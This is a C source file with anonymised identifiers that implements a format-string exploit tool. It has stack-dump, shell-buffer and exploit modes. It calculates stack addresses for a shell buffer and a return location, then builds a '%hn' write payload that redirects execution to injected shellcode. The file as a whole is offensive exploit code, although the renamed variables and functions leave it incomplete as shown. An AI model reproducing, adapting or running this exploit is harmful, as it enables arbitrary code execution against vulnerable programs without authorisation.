
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 char* VAR_8 ;
 int FUNC_0 (char*,int,int) ;
 int FUNC_1 (char*,char*) ;
 int FUNC_2 () ;
 int FUNC_3 (char*,char*,int) ;
 int FUNC_4 (char*,...) ;
 int FUNC_5 (char*,int) ;
 int FUNC_6 (char*,char*,...) ;
 scalar_t__ FUNC_7 (char*,char*,int*) ;
 int FUNC_8 (char*) ;
 int FUNC_9 (char*,char*,int) ;
 int FUNC_10 (int ,char*,int) ;
 int FUNC_11 (char*) ;

FUNC_12(int VAR_9, char **VAR_10)
{
    char VAR_11[VAR_5], VAR_12[VAR_2], VAR_13[256];
    char *VAR_14;
    long VAR_15, VAR_16, VAR_17, VAR_18, VAR_19;
    int VAR_20 = VAR_1, VAR_21 = VAR_0, VAR_22 = VAR_6, VAR_23 = VAR_4, VAR_24 = VAR_3;
    int VAR_25;

    int VAR_26 = 0, VAR_27 = 0, VAR_28 = 0;



    if (VAR_9 < 2) {
        FUNC_11(VAR_10[0]);
    }

    if (!FUNC_9(VAR_10[1], "dump", 4)) { VAR_26 = 1; }
    else if(!FUNC_9(VAR_10[1], "shell", 5)) { VAR_27 = 1; }
    else if(!FUNC_9(VAR_10[1], "exploit", 7)) { VAR_28 = 1; }
    else {
        FUNC_11(VAR_10[0]);
    }

    for (VAR_25 = 2; VAR_25 < VAR_9; VAR_25++) {
        if ( (FUNC_7(VAR_10[VAR_25], "--align=%d", &VAR_21) ||
              FUNC_7(VAR_10[VAR_25], "--num=%d", &VAR_20) ||
              FUNC_7(VAR_10[VAR_25], "--shellofs=%d", &VAR_22) ||
              FUNC_7(VAR_10[VAR_25], "--retlocofs=%d", &VAR_23) ||
              FUNC_7(VAR_10[VAR_25], "--retloc=%x", &VAR_24))== 0) {
                FUNC_4("Unrecognized option %s\n\n", VAR_10[VAR_25]);
                FUNC_11(VAR_10[0]);
            }
    }



    FUNC_0(VAR_11, VAR_21, VAR_24);



    FUNC_10(VAR_7, VAR_13, 256);

    VAR_15 = (FUNC_2() | 0xffff) & 0xfffffffc;
    VAR_16 = VAR_15 - (FUNC_8(VAR_8)+1) - (FUNC_8(VAR_13)+1) - (FUNC_8(VAR_11)+1) + VAR_22;



    FUNC_4("Calculated shell buffer address: 0x%x\n", VAR_16);

    if (VAR_27 == 1) {
        FUNC_5(&VAR_11[VAR_21], VAR_16);
    }

    if ( ((VAR_16 + VAR_21) & 0xfffffffc) != (VAR_16 + VAR_21) ) {
        FUNC_4("Warning: sh_addr + align must be word aligned. Adjust shellofs and align as neccessary\n");
    }

    if (VAR_24 == VAR_3) {
        VAR_24 = VAR_16 + VAR_21 - VAR_20*4 + VAR_23;
        FUNC_4("Calculated retloc: 0x%x\n", VAR_24);

        FUNC_5(&VAR_11[VAR_21+4], VAR_24);
        FUNC_5(&VAR_11[VAR_21+12], VAR_24+2);
    }

    VAR_17 = (VAR_16 + VAR_21) + 64;
    FUNC_4("Calculated shell code jump location: 0x%x\n\n", VAR_17);



    VAR_14 = VAR_12;
    for (VAR_25 = 0; VAR_25 < VAR_20; VAR_25++) {
        FUNC_3(VAR_14, "%.8x", 4);
        VAR_14 = VAR_14 + 4;
    }

    if (VAR_26 == 1) {
        *VAR_14 = 0;
        FUNC_4("Stack dump mode, dumping %d words\n", VAR_20);
    }
    else if (VAR_27 == 1) {
        FUNC_6(VAR_14, " Shell buffer: %%s");

        FUNC_4("shellbuf (length = %d): %s\n\n", FUNC_8(VAR_11)+1, VAR_11);
        FUNC_4("Shell buffer dump mode, shell buffer address is 0x%x\n", VAR_16);
    }
    else {
        VAR_18 = (VAR_17 >> 16) & 0xffff;
        VAR_19 = (VAR_17 >> 0) & 0xffff;

        FUNC_6(VAR_14, "%%%uc%%hn%%%uc%%hn", (VAR_18 - VAR_20 * 8), (VAR_19 - VAR_18));
        FUNC_4("Exploit mode, jumping to 0x%x\n", VAR_17);
    }

    FUNC_4("num: %d\t\talign: %d\tshellofs: %d\tretlocofs: %d\tretloc: 0x%x\n\n",
            VAR_20, VAR_21, VAR_22, VAR_23, VAR_24);



    FUNC_1(VAR_12, VAR_11);

}
